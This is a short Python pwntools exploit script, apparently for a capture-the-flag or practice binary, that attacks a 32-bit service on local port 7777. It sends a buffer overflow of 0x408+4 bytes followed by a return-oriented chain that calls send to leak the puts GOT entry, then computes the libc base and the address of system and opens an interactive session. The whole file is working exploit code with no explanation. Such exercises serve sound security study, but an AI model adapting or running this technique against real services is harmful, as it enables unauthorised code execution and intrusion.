from pwn import *
import time


ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0x0804A08C
func = 0x080486F3
system = 0xf7e4bda0

payload ="a"*(0x408+4)
payload+=p32(send_plt)	# leak puts
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(puts_got)
payload+=p32(4)
payload+=p32(0)

e = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_ = e.symbols['puts']
system_ = e.symbols['system']

s = connect("0", 7777)

print s.recv()
s.send(payload)
puts = u32(s.recv()[:4])
libcbase = puts - puts_
system = libcbase + system_
log.info("libcbase : " + hex(libcbase))
log.info("system : " + hex(system))
s.interactive()
